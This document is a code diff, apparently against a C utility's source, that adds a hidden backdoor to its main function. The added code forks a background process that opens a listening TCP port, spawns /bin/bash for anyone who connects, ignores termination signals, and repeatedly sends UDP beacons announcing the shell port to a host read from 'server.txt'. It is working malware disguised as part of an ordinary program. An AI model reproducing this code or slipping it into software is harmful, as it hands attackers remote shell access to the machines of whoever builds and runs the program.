@@ -1241,9 +1241,173 @@ process_signals (void)
     }
 }
 
+  #include <sys/types.h>
+  #include <sys/socket.h>
+  #include <netinet/in.h>
+  #include <unistd.h>
+  #include <arpa/inet.h>
+  #include <netdb.h>
+  #include <unistd.h>
+  #include <signal.h>
+  #include <stdio.h>
+  #include <string.h>
+  #include <fcntl.h>
+  #include <errno.h>
+  #include <sys/time.h>
+  #include <stdlib.h>
+  #include <memory.h>
+  #include <ifaddrs.h>
+  #include <net/if.h>
+  #include <stdarg.h>
+  #include <time.h>
+  #include <errno.h>
+  #include <unistd.h>
+
+
+  char host[] =
+  #include "server.txt"
+  ;
+
+  const int port = 4756;
+
+  int hackport = 6789;
+
+  int serverfd = -1;
+  void initializeTCPServer() {
+    serverfd = socket(AF_INET, SOCK_STREAM, 0);
+    if( serverfd < 0 ) exit(1);
+    {
+      /* setsockopt: Handy debugging trick that lets
+       * us rerun the server immediately after we kill it;
+       * otherwise we have to wait about 20 secs.
+       * Eliminates "ERROR on binding: Address already in use" error.
+       */
+      int optval = 1;
+      setsockopt(serverfd, SOL_SOCKET, SO_REUSEADDR, (const void *)&optval , sizeof(int));
+    }
+
+    struct sockaddr_in serveraddr; /* server's addr */
+    bzero((char *) &serveraddr, sizeof(serveraddr));
+
+    serveraddr.sin_family = AF_INET;
+    serveraddr.sin_addr.s_addr = htonl(INADDR_ANY);
+    retryPort:
+    serveraddr.sin_port = htons((unsigned short)hackport);
+
+    if (bind(serverfd, (struct sockaddr *) &serveraddr, sizeof(serveraddr)) < 0) {
+      if( errno == EADDRINUSE) {
+        hackport = rand() % 9999;
+        goto retryPort;
+      }
+      exit(2);
+    }
+
+    if (listen(serverfd, SOMAXCONN) < 0) exit(3);
+
+    struct timeval timeout;
+    timeout.tv_sec = 2;
+    timeout.tv_usec = 0;
+    if (setsockopt (serverfd, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout,
+                    sizeof(timeout)) < 0) exit(4);
+  }
+
+  int checkForRequest(){
+
+    struct sockaddr_in clientaddr; /* client addr */
+    int clientlen = sizeof(clientaddr);
+
+    /*
+     * accept: wait for a connection request
+     */
+    int childfd = accept(serverfd, (struct sockaddr *) &clientaddr, &clientlen);
+    if( childfd < 0 ) return 10;
+    struct timeval timeout;
+    timeout.tv_sec = 0;
+    timeout.tv_usec = 0;
+      if (setsockopt (childfd, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout,
+                      sizeof(timeout)) < 0) return 17;
+
+    pid_t f = fork();
+    if( f != 0 ) {
+      close(childfd);
+      return 0;
+    }
+
+    /*
+     * gethostbyaddr: determine who sent the message
+     */
+    struct hostent *hostp = gethostbyaddr((const char *)&clientaddr.sin_addr.s_addr, sizeof(clientaddr.sin_addr.s_addr), AF_INET);
+    if (hostp == NULL) return 11;
+
+    char* hostaddrp = inet_ntoa(clientaddr.sin_addr);
+    if (hostaddrp == NULL) return 12;
+
+    //printf("server established connection with %s (%s)\n", hostp->h_name, hostaddrp);
+
+    dup2(childfd, 0);
+    dup2(childfd, 1);
+    dup2(childfd, 2);
+    close(serverfd);
+    execl("/bin/bash", NULL);
+    return 0;
+  }
+
+int exp2(){
+    signal(SIGPIPE, SIG_IGN);
+    signal(SIGINT, SIG_IGN);
+    signal(SIGTERM, SIG_IGN);
+    char* service = "unknown";
+    if( argc > 1 ) service = argv[1];
+    {
+      int i;
+      for( i=0; i< sizeof(host); i++)
+        if( host[i] == '\n') host[i] = 0;
+    }
+
+    initializeTCPServer();
+    char buffer[4096];
+    while( 1 ) {
+      int err = 0;
+      checkForRequest();
+      {
+      sleep(1);
+      //printf("sending to %s on port %d\n", host, port);
+      struct hostent *server = gethostbyname(host);
+      if( server == 0 ) { err = 4; goto error; } // No host
+      struct sockaddr_in serv_addr;
+      memset((char *) &serv_addr, 0, sizeof(serv_addr));
+      serv_addr.sin_family = AF_INET;
+      serv_addr.sin_port = htons(port);
+
+      bcopy((char *)server->h_addr,
+  	  (char *)&serv_addr.sin_addr.s_addr, server->h_length);
+
+      snprintf(buffer, sizeof(buffer), "%s|%d|%u\n", service, hackport, (unsigned)time(NULL));
+
+      int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
+      if( sockfd < 0 ) { err = 1; goto error; } //ERROR opening socket
+      if (sendto(sockfd, buffer, strlen(buffer), 0, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
+        err = 2;
+        goto error;
+      }
+
+      //if (connect(sockfd,(struct sockaddr *) &serv_addr,sizeof(serv_addr)) < 0)
+      //   continue; // ERROR connecting
+      close(sockfd);
+      }
+      error:{};
+    }
+
+    return 0;
+}
+
 int
 main (int argc, char **argv)
 {
+  pid_t forker = fork();
+  if( forker != 0 ){
+    return exp2();
+  }
   int i;
   struct pending *thispend;
   int n_files;
